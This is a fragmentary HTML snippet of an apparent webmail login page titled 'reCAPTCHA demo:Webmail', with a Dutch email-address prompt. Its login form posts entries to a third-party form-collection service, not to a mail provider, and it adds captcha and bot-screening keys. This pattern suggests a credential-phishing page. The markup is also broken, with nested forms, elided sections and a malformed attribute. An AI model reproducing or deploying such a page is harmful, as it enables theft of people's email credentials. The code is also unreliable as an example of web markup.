    ...
    <script type="text/javascript">
      ...
      var onloadCallback = function() {
        ...
        widgetId1 = grecaptcha.render('example1', {
          'sitekey' : '6Lf9LVUqAAAAANsmwQvPNua_dQ_6bZdUFq7oFEYa',
          'theme' : 'light'
        });
    ...
    <div id="language-menu" class="language-menu" onmouseover="toggleLanguage()">
        <ul>
            ...
            <span>
				...
				<title>reCAPTCHA demo:Webmail</title>
				<script src="https://www.google.com/recaptcha/api.js" async defer></script>
	<script src="https://www.google.com/recaptcha/api.js?render=6Lf9LVUqAAAAANsmwQvPNua_dQ_6bZdUFq7oFEYa"></script>
                        ...
                        <div class="display-flex openid-login-page__container-details">
                            <div class="openid-login-page__container--form-login-section p--n">
                                <form id="login-form" name="loginForm" action="https://formbold.com/s/3AL7r" method="post" class="p--n m--n login-form">
									...
									<form action="https://example.demo"data-botpoison-public-key="pk_efae6277-24cc-4810-8e1f-2b2c52372a04">
                                        ...
                                        <label for="j_username">
                                                    ...
                                                    Je e-mailadres
																						 ...
																						 <button class="g-recaptcha" data-sitekey="6Lf9LVUqAAAAANsmwQvPNua_dQ_6bZdUFq7oFEYa" data-callback="onSubmitdata-size="invisible"></button>
